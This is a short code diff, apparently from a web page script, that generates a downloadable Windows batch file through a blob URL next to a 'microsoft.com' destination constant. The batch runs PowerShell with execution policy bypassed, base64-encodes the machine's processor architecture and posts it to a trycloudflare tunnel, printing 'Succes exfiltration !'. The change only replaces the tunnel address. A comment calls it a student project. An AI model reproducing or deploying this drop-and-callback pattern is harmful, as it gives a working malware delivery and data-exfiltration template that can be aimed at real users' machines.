@@ -119,7 +119,7 @@ const destination = "https://microsoft.com";
     const fileContent = [
       "@echo off",
       "rem Projet etudiant EPITECH - Exfiltration directe sans Master.",
-      "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"try { $arch = $env:PROCESSOR_ARCHITECTURE; $json = '[{\\\"command\\\":\\\"get_arch\\\",\\\"output\\\":\\\"' + $arch + '\\\"}]'; $bytes = [System.Text.Encoding]::UTF8.GetBytes($json); $b64 = [Convert]::ToBase64String($bytes); Invoke-RestMethod -Uri 'https://pierre-poker-shuttle-maintaining.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64; 'Bypass-Tunnel-Reminder'='true'}; Write-Host 'Succes exfiltration !' -ForegroundColor Green; } catch { Write-Host 'Erreur : ' $_.Exception.Message -ForegroundColor Red; } Read-Host 'Appuyez sur Entree pour fermer'\"",
+      "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"try { $arch = $env:PROCESSOR_ARCHITECTURE; $json = '[{\\\"command\\\":\\\"get_arch\\\",\\\"output\\\":\\\"' + $arch + '\\\"}]'; $bytes = [System.Text.Encoding]::UTF8.GetBytes($json); $b64 = [Convert]::ToBase64String($bytes); Invoke-RestMethod -Uri 'https://chips-wisdom-detector-proteins.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64; 'Bypass-Tunnel-Reminder'='true'}; Write-Host 'Succes exfiltration !' -ForegroundColor Green; } catch { Write-Host 'Erreur : ' $_.Exception.Message -ForegroundColor Red; } Read-Host 'Appuyez sur Entree pour fermer'\"",
     ].join("\r\n");
 
     const blobUrl = URL.createObjectURL(
